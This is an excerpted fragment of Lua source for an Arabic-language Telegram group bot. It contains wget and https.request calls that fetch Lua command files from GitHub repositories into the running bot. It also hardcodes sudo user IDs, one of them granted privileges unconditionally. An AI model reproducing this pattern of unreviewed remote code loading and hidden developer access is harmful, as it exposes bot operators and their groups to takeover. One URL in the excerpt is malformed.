...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/jack1eljoker1/Files_syria/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1151371484,1765160742,1726705278}   
...
if tonumber(user_id) == tonumber(1151371484) then  
var = true  
...
os.execute('wget https://raw.githubusercontent.com/jokerrr7/SYRIA3/master/SYRIA.lua')
...
if text == 'المبرمج سوريا' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❈ [المبرمج سوريا](t.me/SIRIA199)')
end
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://https://raw.githubusercontent.com/jack1eljoker1/Files_SYRIA/master/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/jack1eljoker1/Files_SYRIA/master/File_Bot/"..file)
if res == 200 then
...
t = "\n ❈ قائمه حات الكروب \nٴــــــــــــــــــــــ❈ـــــــــــــــــــــٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
zx = JSON.decode(zh)
t = "\n❈ قائمه الزخرفه \nٴ❈ٴــــــــــــــــــــــ❈ـــــــــــــــــــــٴ❈○ٴ \n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  "..v.." \n"
end
send(msg.chat_id_, msg.id_, t..'ٴ❈ٴــــــــــــــــــــــ❈ـــــــــــــــــــــٴ❈○ٴ\n❈ 彡 .[❈ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐿𝐴𝐶𝐾 ❈](t.me/SOURCE_SYRIA)➢ ')
end
...
ٴــــــــــــــــــــــ❈ـــــــــــــــــــــ
